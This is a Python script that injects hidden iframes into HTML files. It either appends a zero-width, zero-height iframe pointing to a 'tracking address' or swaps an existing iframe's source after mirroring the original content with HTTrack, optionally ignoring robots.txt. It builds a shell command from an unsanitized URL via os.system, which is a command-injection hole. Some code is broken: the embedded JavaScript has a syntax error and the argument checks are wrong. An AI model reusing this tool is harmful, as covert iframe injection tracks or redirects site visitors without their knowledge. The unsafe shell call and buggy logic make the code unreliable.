import random
import sys
import traceback
from bs4 import BeautifulSoup, Tag
import os
win_httrack_executable = r'"C:\Program Files\WinHTTrack\httrack.exe"'


def hide_iframe(new_iframe: Tag) -> None:
    new_iframe["width"] = 0
    new_iframe["height"] = 0
    new_iframe["frameborder"] = 0
    new_iframe["scrolling"] = "no"


def create_tracking_iframe(injected_address: str, make_hidden: bool = True) -> Tag:
    soup = BeautifulSoup()
    new_iframe = soup.new_tag('iframe', src=injected_address)
    if make_hidden:
        hide_iframe(new_iframe)
    return new_iframe


def get_js_script_for_changing_visibility():
    return """
        var created_iframe=document.createElement('iframe');
        document.getElementsByTagName('body').length - 1].appendChild(created_iframe);
    """


# all page should be copied to prevent CORS on redirrect!!!
def download_iframe_content(content_link: str, content_to_serve_folder: str, ignore_robots=False) -> None:
    print(win_httrack_executable + ' ' + content_link + r' -v --depth=1 --ext-depth=0 -O ' + content_to_serve_folder)
    if ignore_robots:
        os.system(win_httrack_executable + ' ' + content_link
              + r' -v --depth=1 --ext-depth=0 -O ' + content_to_serve_folder + " ")
    else:
        os.system(win_httrack_executable + ' ' + content_link
                  + r' -v --depth=1 --ext-depth=0 -O ' + content_to_serve_folder + " -%v --robots=3 -r4")


def find_and_manage_iframe(page_soup,
                           tracking_address: str,
                           content_to_serve_folder: str = None,
                           iframe_selector: str = None) -> any:
    selected_iframe = None
    if content_to_serve_folder:
        selected_iframes = page_soup.select("iframe")
        if not iframe_selector and selected_iframes:
            chosen_iframe = random.randrange(0, len(selected_iframes))
            selected_iframe = selected_iframes[chosen_iframe]
        elif iframe_selector:
            selected_iframe = page_soup.select_one(iframe_selector)

    if not selected_iframe:
        print("Iframe not found! Creating new one!...")
        new_iframe = create_tracking_iframe(injected_address=tracking_address)
        print("Appending created iframe to page body!...")
        page_soup.select_one("body").append(new_iframe)
    else:
        print("Downloading iframe content to: " + content_to_serve_folder)
        download_iframe_content(selected_iframe.get("src"), content_to_serve_folder)
        print("Setting src of iframe...")
        selected_iframe["src"] = tracking_address


def process_injection_using_beautiful_soup(html_file_location: str,
                                           tracking_address: str,
                                           content_to_serve_folder: str,
                                           iframe_selector: str = None,
                                           new_file_location: str = None):
    with open(html_file_location, "r", encoding="utf-8", errors="ignore") as file:
        page_soup = BeautifulSoup(file.read(), "html.parser")
    find_and_manage_iframe(page_soup, tracking_address, content_to_serve_folder, iframe_selector)

    if not new_file_location:
        print("Warning... previous document will be replaced!...")
        new_file_location = html_file_location
    print("Saving document to: " + new_file_location)
    with open(new_file_location, "w", encoding="utf-8", errors="ignore") as file:
        file.write(str(page_soup))
    return page_soup


def inject_iframe(html_file_location: str,
                  tracking_address: str,
                  content_to_serve_folder: str = None,
                  iframe_selector: str = None,
                  debug: bool = True):
    try:
        process_injection_using_beautiful_soup(html_file_location, tracking_address,
                                               content_to_serve_folder, iframe_selector)
    except:
        print("Error: injection using loading page failed! Trying to add it manually!")
        if debug:
            print(traceback.print_exc())


if __name__ == "__main__":
    content_to_serve_path = None
    tracking_address_src = None
    html_file = None

    for index in range(1, len(sys.argv), 2):
        name = sys.argv[index]
        if name == "--html_file":
            html_file = sys.argv[index + 1]
        elif name == "--tracking_address":
            tracking_address_src = sys.argv[index + 1]
        elif name == "--content_folder":
            content_to_serve_path = sys.argv[index + 1]
            if content_to_serve_path == "no":
                content_to_serve_path = None
        else:
            raise Exception("Unknown argument: " + name)
    if not html_file:
        raise Exception("Html file not defined!")
    if not html_file:
        raise Exception("Tracking address not defined!")
    if not content_to_serve_path:
        raise Exception("Content to serve path not defined! Creating only hidden iframe!...")
    inject_iframe(html_file, tracking_address_src, content_to_serve_path)
